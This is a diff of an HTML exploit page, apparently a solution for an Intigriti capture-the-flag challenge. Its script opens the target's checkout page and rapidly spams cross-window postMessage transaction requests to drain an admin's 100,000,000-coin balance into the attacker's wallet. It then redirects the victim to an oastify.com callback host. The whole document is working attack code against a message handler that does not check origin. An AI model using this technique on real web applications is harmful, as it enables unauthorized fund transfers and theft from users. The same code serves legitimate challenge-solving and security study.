@@ -2,36 +2,35 @@
 <html>
 <body>
     <script>
-        const COLLAB = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';
-        const TARGET = 'https://challenge-0126.intigriti.io';
-        // Put YOUR wallet address here from your dashboard
-        const MY_WALLET = '1f3d796f822b439dc366e4de68133f13c2'; 
+        const TARGET = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
+        const MY_WALLET = '1f3d796f822b439dc366e4de68133f13c2'; // Your actual wallet address
 
-        // Step 1: Open the target (Ensures cookies are sent)
-        const win = window.open(`${TARGET}/checkout.html?currency=1337COIN&price=1`);
+        // Step 1: Open the target in a new window. 
+        // Even if popups are "off," bots usually allow one window.open per visit.
+        const win = window.open(TARGET);
 
-        // Step 2: Spam the Transfer Message
+        // Step 2: Spam the postMessage immediately and rapidly.
+        // This ensures we catch the 'message' listener on checkout.html as it loads.
         let count = 0;
-        const spammer = setInterval(() => {
+        const interval = setInterval(() => {
             if (win) {
                 win.postMessage({
                     type: 'submitTransaction',
                     transaction: {
                         currency: '1337COIN',
-                        amount: 100000000, // The full Admin balance
-                        toAddress: MY_WALLET 
+                        amount: 100000000, // Draining the 100M balance
+                        toAddress: MY_WALLET
                     }
                 }, '*');
             }
             count++;
-            if (count > 30) clearInterval(spammer);
-        }, 3000);
+            if (count > 50) clearInterval(interval);
+        }, 100); // Very fast spam (10 times per second)
 
-        // Step 3: Confirmation Redirect
-        // After the transfer, check your own dashboard
+        // Step 3: Redirect the Admin to the Dashboard to confirm the theft
         setTimeout(() => {
-            window.location.href = `${TARGET}/dashboard.html`;
-        }, 10000);
+            window.location.href = 'https://xde5h8kz5n3u9f74cqocym2zaqgh48sx.oastify.com/';
+        }, 8000);
     </script>
 </body>
 </html>
